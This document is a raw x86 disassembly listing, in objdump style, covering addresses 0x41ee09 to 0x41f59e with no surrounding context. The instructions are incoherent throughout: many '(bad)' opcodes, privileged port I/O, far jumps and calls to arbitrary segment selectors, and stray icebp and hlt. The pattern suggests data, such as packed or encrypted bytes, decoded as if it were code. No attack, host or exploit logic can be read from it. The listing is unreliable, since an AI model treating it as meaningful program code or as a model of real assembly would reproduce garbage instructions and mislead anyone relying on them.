  41ee09:	adc    al,0x12
  41ee0b:	lahf   
  41ee0c:	sahf   
  41ee0d:	add    esi,0xa934031f
  41ee13:	stos   DWORD PTR es:[edi],eax
  41ee14:	sbb    dl,BYTE PTR ds:0xca45e458
  41ee1a:	fwait
  41ee1b:	xor    eax,0x7362a440
  41ee20:	dec    ebx
  41ee21:	mov    dh,0xe4
  41ee23:	cmp    ebx,DWORD PTR [eax+0x683faba]
  41ee29:	jb     0x41edc3
  41ee2b:	pop    es
  41ee2c:	repz xchg ebp,eax
  41ee2e:	jecxz  0x41edde
  41ee30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee31:	popf   
  41ee32:	inc    edi
  41ee33:	mov    cs,WORD PTR [esi+0x58]
  41ee36:	add    BYTE PTR [edx+0x5e],dh
  41ee39:	scas   al,BYTE PTR es:[edi]
  41ee3a:	mov    eax,0x5e69a3f7
  41ee3f:	jp     0x41edfe
  41ee41:	push   edi
  41ee42:	aam    0x7b
  41ee44:	scas   al,BYTE PTR es:[edi]
  41ee45:	out    0xf1,al
  41ee47:	fwait
  41ee48:	out    0xd9,eax
  41ee4a:	cmp    al,0xfa
  41ee4c:	out    0xeb,al
  41ee4e:	mov    cl,0x98
  41ee50:	into   
  41ee51:	js     0x41eebe
  41ee53:	lahf   
  41ee54:	sbb    eax,0x9dbafc8d
  41ee59:	inc    ecx
  41ee5a:	inc    ebx
  41ee5b:	pop    ds
  41ee5c:	sub    BYTE PTR [edx],al
  41ee5e:	pop    ss
  41ee5f:	enter  0xfb78,0xeb
  41ee63:	and    ecx,edx
  41ee65:	nop
  41ee66:	or     eax,0xb3056768
  41ee6b:	aam    0x8
  41ee6d:	xor    al,bl
  41ee6f:	sbb    eax,edx
  41ee71:	mov    DWORD PTR [eax-0x17],esi
  41ee74:	push   esp
  41ee75:	(bad)  
  41ee76:	sahf   
  41ee77:	pop    ss
  41ee78:	and    BYTE PTR [edi],dh
  41ee7a:	and    al,0xd7
  41ee7c:	daa    
  41ee7d:	cdq    
  41ee7e:	int    0x81
  41ee80:	lock mov ds:0x5e8abf15,al
  41ee86:	push   edx
  41ee87:	mov    dh,0x98
  41ee89:	jmp    0x41ee5c
  41ee8b:	mov    eax,ds:0xc10e11ab
  41ee90:	mov    ch,0xef
  41ee92:	xor    DWORD PTR [ecx],esp
  41ee94:	xchg   esp,eax
  41ee95:	pop    edx
  41ee96:	ins    DWORD PTR es:[edi],dx
  41ee97:	mov    esi,0x5ffb33e9
  41ee9c:	in     eax,0x6f
  41ee9e:	pop    edi
  41ee9f:	test   al,0x3d
  41eea1:	int3   
  41eea2:	cmp    al,0xd8
  41eea4:	inc    edi
  41eea5:	(bad)  
  41eea6:	cli    
  41eea7:	and    al,0xe2
  41eea9:	xchg   edx,eax
  41eeaa:	or     ebp,DWORD PTR [edi]
  41eeac:	mov    edx,0xfac82f1d
  41eeb1:	push   edi
  41eeb2:	push   esp
  41eeb3:	push   esp
  41eeb4:	pop    edx
  41eeb5:	cmp    eax,0xf17ef7ff
  41eeba:	test   BYTE PTR [edx],0x27
  41eebd:	and    al,0x4e
  41eebf:	aad    0x6f
  41eec1:	fmul   st(1),st
  41eec3:	add    eax,0xa48d450b
  41eec8:	lahf   
  41eec9:	les    esp,FWORD PTR [edx-0x5534acb8]
  41eecf:	ss mov esi,0x301f1543
  41eed5:	push   ss
  41eed6:	xor    BYTE PTR [eax-0x64],bl
  41eed9:	lock jmp 0x25f:0x537171c0
  41eee1:	(bad)  
  41eee2:	sbb    cl,BYTE PTR [ebx+0x4]
  41eee5:	or     DWORD PTR [edi+0x74b549e6],esi
  41eeeb:	jne    0x41eeec
  41eeed:	test   eax,0x38c7b426
  41eef2:	and    al,0xbb
  41eef4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eef5:	cdq    
  41eef6:	das    
  41eef7:	push   ebx
  41eef8:	jno    0x41ef3a
  41eefa:	bound  ebp,QWORD PTR [edi+0x25]
  41eefd:	aas    
  41eefe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eeff:	sub    ebx,DWORD PTR [edx+eax*1+0x133b3992]
  41ef06:	push   0x76e6f708
  41ef0b:	fsub   DWORD PTR [ebx+0x6e726cbb]
  41ef11:	jne    0x41ef66
  41ef13:	out    0x42,al
  41ef15:	aas    
  41ef16:	mov    ah,0x87
  41ef18:	popa   
  41ef19:	icebp  
  41ef1a:	in     al,dx
  41ef1b:	into   
  41ef1c:	neg    BYTE PTR [ecx+esi*4+0x64c2032]
  41ef23:	sti    
  41ef24:	inc    ebp
  41ef25:	adc    dh,dh
  41ef27:	push   es
  41ef28:	jmp    0xb77ecc2a
  41ef2d:	lsl    edi,WORD PTR [ecx-0x3c]
  41ef31:	call   0x8ccd54da
  41ef36:	pop    eax
  41ef37:	retf   
  41ef38:	inc    edi
  41ef39:	sti    
  41ef3a:	inc    edx
  41ef3b:	mov    dh,0xc9
  41ef3d:	inc    esi
  41ef3e:	imul   edi,DWORD PTR [edx+0x56],0x3e
  41ef42:	jl     0x41eec8
  41ef44:	xor    al,0xda
  41ef46:	dec    edx
  41ef47:	call   0xf484:0x483b3df5
  41ef4e:	hlt    
  41ef4f:	cld    
  41ef50:	ins    DWORD PTR es:[edi],dx
  41ef51:	sub    eax,0x73c1098b
  41ef56:	(bad)  
  41ef58:	mov    ah,0xcf
  41ef5a:	nop
  41ef5b:	mov    ds:0x6bb4b376,eax
  41ef60:	jmp    0x52c4890a
  41ef65:	xor    BYTE PTR [ebp+edi*4+0x48],dl
  41ef69:	xor    dh,al
  41ef6b:	sbb    edx,DWORD PTR [eax-0x73]
  41ef6e:	imul   edx,DWORD PTR [ebp+0x7dfc3cee],0x62c30294
  41ef78:	push   0x75
  41ef7a:	and    ebx,DWORD PTR [eax-0x270d3026]
  41ef80:	mov    esp,DWORD PTR [ebx-0x6b]
  41ef83:	mov    esp,0xd0712735
  41ef88:	mov    ecx,ecx
  41ef8a:	pusha  
  41ef8b:	leave  
  41ef8c:	mov    ah,0xe9
  41ef8e:	xchg   ecx,eax
  41ef8f:	jmp    0x423de369
  41ef94:	adc    ebx,ecx
  41ef96:	dec    edi
  41ef97:	pop    ebp
  41ef98:	cmp    al,bl
  41ef9a:	lahf   
  41ef9b:	mul    ebp
  41ef9d:	imul   esi,DWORD PTR [edx-0xc],0x39
  41efa1:	jnp    0x41efd0
  41efa3:	jae    0x41efb5
  41efa5:	or     eax,0xca88f7c5
  41efaa:	std    
  41efab:	push   ds
  41efac:	mov    edx,0x324897fa
  41efb1:	xchg   esi,eax
  41efb2:	fmul   st,st(4)
  41efb4:	fsubr  QWORD PTR [ecx+0x70]
  41efb7:	icebp  
  41efb8:	(bad)  
  41efb9:	retf   
  41efba:	jg     0x41ef7b
  41efbc:	fwait
  41efbd:	adc    al,0xcb
  41efbf:	jg     0x41f025
  41efc1:	mov    ds:0xcfc2b482,al
  41efc6:	adc    BYTE PTR [eax+0x65],ch
  41efc9:	mov    DWORD PTR [edi],ecx
  41efcb:	nop
  41efcc:	mov    dh,0xd5
  41efce:	mov    ds:0x7b6449e9,al
  41efd3:	jo     0x41efe1
  41efd5:	dec    edx
  41efd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efd7:	push   ecx
  41efd8:	aam    0x49
  41efda:	mov    ch,BYTE PTR [edi]
  41efdc:	jp     0x41efa2
  41efde:	aam    0xd5
  41efe0:	sub    al,0x25
  41efe2:	lea    ebx,[esi-0x76]
  41efe5:	ins    BYTE PTR es:[edi],dx
  41efe6:	div    BYTE PTR [edi+0x241ed08e]
  41efec:	mov    eax,ecx
  41efee:	leave  
  41efef:	sub    bh,BYTE PTR [ebp-0x5e5f85b0]
  41eff5:	jmp    0x3dab435b
  41effa:	ror    ecx,0xf8
  41effd:	sti    
  41effe:	in     al,0x60
  41f000:	inc    ecx
  41f001:	mov    dl,BYTE PTR [edx+0x7]
  41f004:	ror    BYTE PTR [ebp+0x2c7e688e],0x13
  41f00b:	lods   al,BYTE PTR ds:[esi]
  41f00c:	xchg   ebx,eax
  41f00d:	dec    ebx
  41f00e:	arpl   WORD PTR [ebx],sp
  41f010:	dec    ecx
  41f011:	into   
  41f012:	mov    dh,0x5b
  41f014:	test   bl,ch
  41f016:	lahf   
  41f017:	pop    ebp
  41f018:	sbb    edx,ebx
  41f01a:	clc    
  41f01b:	cld    
  41f01c:	xor    DWORD PTR [ebx+0xc],edx
  41f01f:	push   ebx
  41f020:	in     al,dx
  41f021:	aam    0xcf
  41f023:	sbb    DWORD PTR [esi+0x21],ebp
  41f026:	cmp    eax,0x41a23b3d
  41f02b:	push   0xffffffea
  41f02d:	mov    dl,0x6e
  41f02f:	repz fistp DWORD PTR [ecx+0x39266f0]
  41f036:	popa   
  41f037:	mov    dl,0x8d
  41f039:	lahf   
  41f03a:	cmp    al,0xfb
  41f03c:	add    DWORD PTR [edi-0x6f],esi
  41f03f:	fsub   QWORD PTR ds:0xf671f001
  41f045:	jnp    0x41f012
  41f047:	div    DWORD PTR [edi-0x4230307b]
  41f04d:	jne    0x41efe9
  41f04f:	imul   ebx,DWORD PTR [edx],0xc954b04d
  41f055:	mov    eax,0x3f4b641f
  41f05a:	push   edx
  41f05b:	ds jge 0x41f043
  41f05e:	jecxz  0x41f063
  41f060:	adc    DWORD PTR [ebx],esi
  41f062:	out    dx,eax
  41f063:	push   ebx
  41f064:	cmc    
  41f065:	repz and DWORD PTR [eax-0xc],eax
  41f069:	adc    edx,DWORD PTR [edi]
  41f06b:	aas    
  41f06c:	ins    BYTE PTR es:[edi],dx
  41f06d:	mov    BYTE PTR [edi-0x424b532d],0x66
  41f074:	pop    ebp
  41f075:	pop    ds
  41f076:	rcl    edx,0xf6
  41f079:	xor    al,0x6f
  41f07b:	add    DWORD PTR [ecx+esi*1],ebp
  41f07e:	fwait
  41f07f:	jg     0x41f05f
  41f081:	pop    ebp
  41f082:	jmp    0x30cdba5c
  41f087:	int3   
  41f088:	pop    eax
  41f089:	shl    DWORD PTR [ecx-0x2d],0xb
  41f08d:	add    dh,cl
  41f08f:	lock scas eax,DWORD PTR es:[edi]
  41f091:	pusha  
  41f092:	inc    ebx
  41f093:	mov    ?,WORD PTR fs:[ecx]
  41f096:	outs   dx,DWORD PTR ds:[esi]
  41f097:	imul   esi,DWORD PTR [edx-0x238ce1b],0xb27e8d07
  41f0a1:	or     eax,0x5a3f8c98
  41f0a6:	mov    ds:0x7c563bf4,al
  41f0ab:	pop    es
  41f0ac:	adc    ch,ah
  41f0ae:	push   0x80db6dd3
  41f0b3:	icebp  
  41f0b4:	dec    eax
  41f0b5:	stos   BYTE PTR es:[edi],al
  41f0b6:	daa    
  41f0b7:	mov    cl,0xf1
  41f0b9:	dec    ecx
  41f0ba:	lea    ebx,[esi+esi*1-0x7d]
  41f0be:	cld    
  41f0bf:	dec    ebp
  41f0c0:	add    DWORD PTR [edx],0x32c9be8c
  41f0c6:	adc    DWORD PTR [edi+0x9206be5],edx
  41f0cc:	xor    bl,BYTE PTR [edx]
  41f0ce:	lahf   
  41f0cf:	pop    esp
  41f0d0:	(bad)  
  41f0d1:	mov    ch,0xd9
  41f0d3:	je     0x41f0c0
  41f0d5:	cmc    
  41f0d6:	pop    esp
  41f0d7:	sub    edx,0x28
  41f0da:	cmp    ah,BYTE PTR [edx+0x10681281]
  41f0e0:	and    al,0x32
  41f0e2:	fs push cs
  41f0e4:	dec    edi
  41f0e5:	xor    DWORD PTR ds:0x18e8898f,edi
  41f0eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0ec:	sbb    ah,0x12
  41f0ef:	jmp    0x4bb8:0xbcc0f32f
  41f0f6:	jns    0x41f12a
  41f0f8:	leave  
  41f0f9:	inc    edx
  41f0fa:	fst    DWORD PTR [esi+0x79]
  41f0fd:	fcmovnb st,st(1)
  41f0ff:	mov    dh,0xe1
  41f101:	cmp    esp,DWORD PTR [ebx]
  41f103:	push   cs
  41f104:	push   ds
  41f105:	je     0x41f16a
  41f107:	add    eax,0x7ff00033
  41f10c:	inc    esp
  41f10d:	shr    WORD PTR [ebx+eiz*4+0x6ac54795],cl
  41f115:	dec    ecx
  41f116:	and    DWORD PTR [ebx-0x7f49bb17],0x22b4af6b
  41f120:	cmc    
  41f121:	adc    BYTE PTR [eax],cl
  41f123:	jbe    0x41f0c5
  41f125:	xchg   ebp,eax
  41f126:	mov    BYTE PTR [ecx+0x2d],cl
  41f129:	das    
  41f12a:	mov    ecx,0x90fb0678
  41f12f:	mov    edi,0xaedf15ee
  41f134:	popf   
  41f135:	fbstp  TBYTE PTR [esi]
  41f137:	jo     0x41f0cd
  41f139:	and    dl,ch
  41f13b:	imul   ebp,DWORD PTR [esi],0xd8022f3
  41f141:	dec    ebx
  41f142:	or     DWORD PTR [edi-0x134c7c68],edi
  41f148:	pop    ebp
  41f149:	in     eax,dx
  41f14a:	lock cmp ebp,DWORD PTR [eax+0x6d91e3f8]
  41f151:	and    dh,BYTE PTR [ecx+0x3]
  41f154:	stos   BYTE PTR es:[edi],al
  41f155:	push   esi
  41f156:	(bad)  
  41f157:	ret    
  41f158:	inc    ebx
  41f159:	xor    al,0xc7
  41f15b:	or     eax,0x710a6f5
  41f160:	in     eax,0x64
  41f162:	test   DWORD PTR [edi-0x4e],ebp
  41f165:	into   
  41f166:	sti    
  41f167:	mov    edx,edx
  41f169:	test   al,0xd7
  41f16b:	jp     0x41f147
  41f16d:	mov    ebx,0x8c4389fd
  41f172:	icebp  
  41f173:	imul   edx
  41f175:	lods   al,BYTE PTR ds:[esi]
  41f176:	adc    BYTE PTR [ecx-0x7baaaac],cl
  41f17c:	xlat   BYTE PTR ds:[ebx]
  41f17d:	fcom   DWORD PTR [edi]
  41f17f:	xchg   edx,eax
  41f180:	sub    al,0xa2
  41f182:	cmp    eax,0x235f6906
  41f187:	adc    DWORD PTR [edi],0x5b346556
  41f18d:	in     al,0xad
  41f18f:	not    edi
  41f191:	push   ebx
  41f192:	and    al,0xa7
  41f194:	stos   BYTE PTR es:[edi],al
  41f195:	cmp    dl,0x67
  41f198:	pop    edx
  41f199:	jmp    0xea8a1a7b
  41f19e:	xchg   edi,eax
  41f19f:	pop    es
  41f1a0:	dec    esi
  41f1a1:	cdq    
  41f1a2:	adc    DWORD PTR [ecx+0x676bf7d6],ebx
  41f1a8:	jecxz  0x41f18a
  41f1aa:	not    BYTE PTR [esi]
  41f1ac:	add    dh,BYTE PTR [edi+0x69]
  41f1af:	jmp    0x7c30:0x7fee3c8d
  41f1b6:	das    
  41f1b7:	lods   al,BYTE PTR ds:[esi]
  41f1b8:	cwde   
  41f1b9:	dec    ebx
  41f1ba:	inc    ebx
  41f1bb:	pop    ebp
  41f1bc:	int3   
  41f1bd:	sahf   
  41f1be:	mov    al,0x1d
  41f1c0:	fld    DWORD PTR [eax]
  41f1c2:	cli    
  41f1c3:	test   BYTE PTR [edx-0x5bca561a],bl
  41f1c9:	sti    
  41f1ca:	and    DWORD PTR [edx-0x3817f5bc],esp
  41f1d0:	adc    edi,DWORD PTR [ebx-0x1d]
  41f1d3:	mov    ds:0x80457cbf,al
  41f1d8:	inc    edi
  41f1d9:	jno    0x41f23b
  41f1db:	scas   al,BYTE PTR es:[edi]
  41f1dc:	test   al,0x58
  41f1de:	add    bh,dl
  41f1e0:	mov    ds:0xf200b331,al
  41f1e5:	adc    DWORD PTR ds:0x31a85399,0xa35adfdb
  41f1ef:	jmp    DWORD PTR [edx]
  41f1f1:	push   ds
  41f1f2:	ds xor bh,ah
  41f1f5:	jne    0x41f23d
  41f1f7:	inc    esi
  41f1f8:	add    DWORD PTR [esi],0xffffff84
  41f1fb:	mov    edi,0x1a07c526
  41f200:	in     eax,0x4c
  41f202:	mov    DWORD PTR ds:0x3c7b48f9,ebp
  41f208:	into   
  41f209:	xchg   ebx,eax
  41f20a:	out    dx,eax
  41f20b:	inc    ebp
  41f20c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f20d:	sub    DWORD PTR [edi-0x33258452],esi
  41f213:	adc    al,0x5c
  41f215:	push   eax
  41f216:	mov    cl,0x65
  41f218:	push   esi
  41f219:	sti    
  41f21a:	mov    bl,0x80
  41f21c:	sub    cl,BYTE PTR [ebp+0x2274d0c1]
  41f222:	imul   edx,ecx,0x997b4aa
  41f228:	ret    
  41f229:	cmp    DWORD PTR [ebx],0xffffff81
  41f22c:	fwait
  41f22d:	div    DWORD PTR ds:[edx-0x5d]
  41f231:	sbb    DWORD PTR [ecx+0x1528c0d1],eax
  41f237:	lahf   
  41f238:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f239:	retf   0x4f1a
  41f23c:	iret   
  41f23d:	(bad)  
  41f23e:	jo     0x41f1f7
  41f240:	pushf  
  41f241:	cs mov eax,0x31580b13
  41f247:	add    al,0x9c
  41f249:	imul   ebx,DWORD PTR [ebx+0x71efce23],0xbd2ed589
  41f253:	sti    
  41f254:	out    dx,eax
  41f255:	xor    DWORD PTR [ecx-0x5b],ecx
  41f258:	in     al,dx
  41f259:	or     BYTE PTR [ebx],0x8e
  41f25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f25d:	mov    eax,ds:0xe488ab85
  41f262:	cli    
  41f263:	lar    edx,cx
  41f266:	jne    0x41f283
  41f268:	mov    ah,0xd6
  41f26a:	inc    ebx
  41f26b:	mov    ecx,ebp
  41f26d:	and    DWORD PTR [ecx+0x13a5b2cc],0xffffffe4
  41f274:	jg     0x41f2b3
  41f276:	mov    al,ds:0x3355a424
  41f27b:	call   0x3235:0xf619a750
  41f282:	mov    ebx,0xe56df6d5
  41f287:	jno    0x41f291
  41f289:	or     eax,0x797645af
  41f28e:	es sub edx,ebp
  41f291:	out    dx,al
  41f292:	or     dh,BYTE PTR [edi+0x68]
  41f295:	cmp    ch,BYTE PTR ds:0xb7b4d37e
  41f29b:	idiv   DWORD PTR [edi-0x39]
  41f29e:	add    esi,DWORD PTR gs:[esi+0x33]
  41f2a2:	data16 sub al,0x3c
  41f2a5:	fnstsw WORD PTR [eax-0x5d13fc6e]
  41f2ab:	ror    DWORD PTR [eax+0x13ae584d],cl
  41f2b1:	fcom   DWORD PTR [edx]
  41f2b3:	push   0x88737031
  41f2b8:	mov    esp,ebp
  41f2ba:	outs   dx,DWORD PTR ds:[esi]
  41f2bb:	loop   0x41f26a
  41f2bd:	shr    BYTE PTR [edx],cl
  41f2bf:	push   ebp
  41f2c0:	fld    DWORD PTR [ebx+0x22993598]
  41f2c6:	and    DWORD PTR [ebx-0x6f],ebp
  41f2c9:	add    al,0xa0
  41f2cb:	shl    eax,0x64
  41f2ce:	jne    0x41f271
  41f2d0:	jbe    0x41f342
  41f2d2:	sbb    DWORD PTR [esi+ebp*8],esi
  41f2d5:	push   cs
  41f2d6:	cli    
  41f2d7:	test   eax,0x62b92738
  41f2dc:	add    esi,edi
  41f2de:	sub    al,0xdb
  41f2e0:	dec    esp
  41f2e1:	and    DWORD PTR [ebx],ebx
  41f2e3:	jg     0x41f2ad
  41f2e5:	sti    
  41f2e6:	mov    edi,0x7b306287
  41f2eb:	xchg   ebp,eax
  41f2ec:	adc    DWORD PTR [ebp-0x77],esp
  41f2ef:	and    dl,BYTE PTR [edi]
  41f2f1:	ret    0xb797
  41f2f4:	cmp    bl,BYTE PTR [eax+edx*2]
  41f2f7:	adc    DWORD PTR [edx+ebx*1+0x67ff3501],edx
  41f2fe:	nop
  41f2ff:	pop    esp
  41f300:	(bad)  
  41f301:	jae    0x41f380
  41f303:	mov    BYTE PTR [eax+0xf],bh
  41f306:	push   edx
  41f307:	mov    BYTE PTR [edi-0x64135b48],bl
  41f30d:	jbe    0x41f31b
  41f30f:	(bad)  
  41f310:	push   esp
  41f311:	sub    al,0xab
  41f313:	dec    esi
  41f314:	arpl   WORD PTR [ebx],ax
  41f316:	in     al,0xae
  41f318:	add    ebp,DWORD PTR [ebx-0x49]
  41f31b:	jbe    0x41f2c7
  41f31d:	mov    ecx,0xf204ae5b
  41f322:	bswap  esp
  41f324:	imul   edi,DWORD PTR [ebx+ebp*4+0x15506b0],0xffffffc3
  41f32c:	push   edx
  41f32d:	test   al,0x27
  41f32f:	sahf   
  41f330:	hlt    
  41f331:	ins    BYTE PTR es:[edi],dx
  41f332:	fadd   st(5),st
  41f334:	out    dx,al
  41f335:	dec    edi
  41f336:	jnp    0x41f39f
  41f338:	and    DWORD PTR [ebx-0x213765a4],0x6d
  41f33f:	stos   BYTE PTR es:[edi],al
  41f340:	sub    dl,dl
  41f342:	sub    DWORD PTR [ebx+0x73],edx
  41f345:	inc    esi
  41f346:	shr    DWORD PTR cs:[edi-0x71],1
  41f34a:	pop    ds
  41f34b:	out    dx,al
  41f34c:	pop    esp
  41f34d:	push   0x4d45588e
  41f352:	xchg   esp,eax
  41f353:	xor    dl,BYTE PTR [eax+0x30a31e02]
  41f359:	out    dx,eax
  41f35a:	xor    esp,DWORD PTR [edi-0x3a4138a]
  41f360:	dec    eax
  41f361:	out    dx,eax
  41f362:	jae    0x41f37e
  41f364:	push   ebx
  41f365:	xchg   ebx,eax
  41f366:	adc    esp,esp
  41f368:	sbb    eax,0x56beeef
  41f36d:	pop    ecx
  41f36e:	and    dh,BYTE PTR [ebp+0x4]
  41f371:	inc    ebx
  41f372:	call   0x92f5:0xb1933499
  41f379:	jecxz  0x41f305
  41f37b:	cmp    eax,0xe1c9eb4e
  41f380:	xchg   ebx,eax
  41f381:	and    eax,0xa83b1d13
  41f386:	fwait
  41f387:	xchg   edi,eax
  41f388:	mov    eax,0x1e9d1194
  41f38d:	test   BYTE PTR ds:0xcb142a90,ch
  41f393:	in     al,dx
  41f394:	xor    al,0x1f
  41f396:	add    dh,BYTE PTR [eax+0x14]
  41f399:	adc    BYTE PTR [edx],0xba
  41f39c:	pop    eax
  41f39d:	sub    ecx,edi
  41f39f:	cmp    al,BYTE PTR [edi-0x66d176eb]
  41f3a5:	mov    dl,0xdf
  41f3a7:	test   BYTE PTR [edi+0x2c],dh
  41f3aa:	aam    0x30
  41f3ac:	pop    edi
  41f3ad:	outs   dx,DWORD PTR ds:[esi]
  41f3ae:	sub    DWORD PTR [edx+0x49ef0d2],edi
  41f3b4:	lahf   
  41f3b5:	dec    BYTE PTR [eax+0x79]
  41f3b8:	in     eax,dx
  41f3b9:	aas    
  41f3ba:	sar    DWORD PTR ds:0x5a14768c,0x8
  41f3c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3c2:	shl    DWORD PTR [ecx+0x29],cl
  41f3c5:	inc    edx
  41f3c6:	push   eax
  41f3c7:	cld    
  41f3c8:	jl     0x41f398
  41f3ca:	addr16 nop
  41f3cc:	mov    BYTE PTR [esi+0x4b],ah
  41f3cf:	sbb    ch,cl
  41f3d1:	xchg   DWORD PTR [ecx],ebp
  41f3d3:	fs push ss
  41f3d5:	fxch   st(6)
  41f3d7:	fwait
  41f3d8:	mov    ebp,0x61b02cf7
  41f3dd:	and    eax,0x399731ab
  41f3e2:	jae    0x41f446
  41f3e4:	xchg   edi,eax
  41f3e5:	sub    dl,BYTE PTR [ebp+0x23c68974]
  41f3eb:	sub    edi,DWORD PTR [esi-0x5ad1d7a4]
  41f3f1:	enter  0x7065,0x84
  41f3f5:	inc    esi
  41f3f6:	shl    DWORD PTR [eax-0x5a7fdf85],0x2b
  41f3fd:	and    ebp,0x13
  41f400:	das    
  41f401:	nop
  41f402:	imul   ecx,DWORD PTR [esi+0x43644b4e],0x440c7652
  41f40c:	shl    BYTE PTR [ecx+0xbc184e0],0xc1
  41f413:	push   cs
  41f414:	dec    edx
  41f415:	push   edi
  41f416:	mov    eax,ds:0xf5c21f4b
  41f41b:	jmp    0x6e1d:0xe3c875d9
  41f422:	mov    ah,0x5a
  41f424:	pop    ebp
  41f425:	js     0x41f429
  41f427:	mov    ebx,0xaeb62859
  41f42c:	dec    edi
  41f42d:	cmp    esp,edi
  41f42f:	jmp    0x396b:0xe445f852
  41f436:	mov    ebp,0xb8512797
  41f43b:	and    edx,edx
  41f43d:	dec    esp
  41f43e:	(bad)  
  41f440:	ret    0xf080
  41f443:	fst    DWORD PTR [ecx-0x3c7b8f43]
  41f449:	mov    WORD PTR [eax+0x7d],ss
  41f44c:	xchg   ebx,eax
  41f44d:	inc    esp
  41f44e:	sahf   
  41f44f:	mov    ecx,0x1417487d
  41f454:	ror    eax,0x1c
  41f457:	and    al,0x90
  41f459:	iret   
  41f45a:	pop    ecx
  41f45b:	test   cl,al
  41f45d:	xor    BYTE PTR [eax-0x2f],ah
  41f460:	dec    edi
  41f461:	sahf   
  41f462:	dec    esp
  41f463:	cmp    BYTE PTR [ecx+0x2b],ah
  41f466:	mov    DWORD PTR [esi],edi
  41f468:	pop    es
  41f469:	mov    edi,0xdb68e1c7
  41f46e:	icebp  
  41f46f:	xchg   esp,eax
  41f470:	xor    eax,0x41f41db2
  41f475:	or     BYTE PTR [edi-0x3d8f1d],bl
  41f47b:	pop    ebx
  41f47c:	pop    ecx
  41f47d:	cmc    
  41f47e:	in     al,0x7b
  41f480:	sub    BYTE PTR [ecx+0x3a],cl
  41f483:	in     eax,dx
  41f484:	add    edi,eax
  41f486:	stos   BYTE PTR es:[edi],al
  41f487:	fs lea eax,cs:[esi-0x30]
  41f48c:	imul   esi,DWORD PTR [esi+eax*8+0x31],0x69bef5bd
  41f494:	(bad)  
  41f495:	iret   
  41f496:	fsubr  QWORD PTR [ecx]
  41f498:	cs es aad 0x10
  41f49c:	daa    
  41f49d:	popf   
  41f49e:	xchg   ebp,ebx
  41f4a0:	dec    ecx
  41f4a1:	jne    0x41f503
  41f4a3:	in     eax,dx
  41f4a4:	repz shl esi,cl
  41f4a7:	repz retf 0x57c7
  41f4ab:	mov    bh,bl
  41f4ad:	cmp    edx,DWORD PTR ds:0x2861aad4
  41f4b4:	pop    ecx
  41f4b5:	cdq    
  41f4b6:	mov    esp,0x5cd33196
  41f4bb:	pop    edx
  41f4bc:	rol    DWORD PTR [edi-0x75],1
  41f4bf:	pop    ss
  41f4c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4c1:	pushw  0xffe3
  41f4c4:	dec    ebp
  41f4c5:	pusha  
  41f4c6:	call   0x9b0066eb
  41f4cb:	lock and ah,dh
  41f4ce:	jge    0x41f544
  41f4d0:	fdivrp st(7),st
  41f4d2:	bound  esi,QWORD PTR [edi-0x18]
  41f4d5:	mov    cl,0x0
  41f4d7:	inc    esp
  41f4d8:	inc    ebx
  41f4d9:	mov    edx,0xf3df22f6
  41f4de:	add    eax,ebp
  41f4e0:	mov    cl,0xb
  41f4e2:	and    DWORD PTR [eax+0x4a],edi
  41f4e5:	shl    ebp,1
  41f4e7:	test   al,0x42
  41f4e9:	fist   WORD PTR [edx]
  41f4eb:	xor    ch,dh
  41f4ed:	call   0xe010:0x9f79e894
  41f4f4:	hlt    
  41f4f5:	pushf  
  41f4f6:	cmp    BYTE PTR [edi],dl
  41f4f8:	push   cs
  41f4f9:	je     0x41f4f9
  41f4fb:	sbb    al,0x4d
  41f4fd:	shr    BYTE PTR [edx],cl
  41f4ff:	mov    edx,0x9938c07c
  41f504:	dec    ebx
  41f505:	retf   
  41f506:	mov    DWORD PTR [ecx-0x42],edx
  41f509:	(bad)  
  41f50a:	fwait
  41f50b:	push   es
  41f50c:	fisubr WORD PTR [edi-0x3f2aa4dd]
  41f512:	icebp  
  41f513:	xchg   cl,dl
  41f515:	and    ah,bh
  41f517:	mov    ds:0x6570cf96,al
  41f51c:	mov    DWORD PTR [edi],esi
  41f51e:	icebp  
  41f51f:	sbb    ah,BYTE PTR ss:[ebx]
  41f522:	xor    dh,ch
  41f524:	dec    esi
  41f525:	inc    eax
  41f526:	mov    bh,0x4f
  41f528:	fldenv [ebx]
  41f52a:	ret    
  41f52b:	cdq    
  41f52c:	inc    ebp
  41f52d:	pop    esi
  41f52e:	pop    edi
  41f52f:	dec    edx
  41f530:	xor    bl,BYTE PTR [edi+eiz*4]
  41f533:	push   eax
  41f534:	mov    al,ds:0x57fcd3ad
  41f539:	add    BYTE PTR [edi*2-0x3565a987],cl
  41f540:	jge    0x41f52a
  41f542:	rol    al,1
  41f544:	and    al,BYTE PTR [ecx-0x1f]
  41f547:	dec    edi
  41f548:	mov    ecx,eax
  41f54a:	sbb    ebx,DWORD PTR [ecx-0x33]
  41f54d:	cwde   
  41f54e:	xlat   BYTE PTR ds:[ebx]
  41f54f:	rcr    BYTE PTR [ecx+edi*2],cl
  41f552:	sub    edi,esp
  41f554:	and    al,cl
  41f556:	adc    DWORD PTR [ebx],esp
  41f558:	mov    bh,0x6e
  41f55a:	out    0xf1,al
  41f55c:	add    DWORD PTR [esi+0x5f],edi
  41f55f:	js     0x41f58c
  41f561:	dec    ecx
  41f562:	popa   
  41f563:	shl    dh,cl
  41f565:	ja     0x41f558
  41f567:	push   0xffffffbb
  41f569:	sub    eax,0xe507833e
  41f56e:	adc    al,0x63
  41f570:	repnz xchg esi,eax
  41f572:	adc    cl,BYTE PTR [esi]
  41f574:	stc    
  41f575:	iret   
  41f576:	mov    DWORD PTR [edx],esi
  41f578:	xor    eax,0xd26edda8
  41f57d:	sbb    eax,0x760c97ec
  41f582:	and    eax,0x7fb66e3e
  41f587:	mov    WORD PTR [esi+0x38],cs
  41f58a:	rcr    DWORD PTR [eax+eax*8-0xa],0x5f
  41f58f:	fidiv  DWORD PTR cs:[edx+0x6f]
  41f593:	imul   eax,DWORD PTR [edx+0x22790dc8],0xffffff89
  41f59a:	mov    dl,0x9a
  41f59c:	jge    0x41f544
  41f59e:	div    DWORD PTR ds:0x1d1ecb88
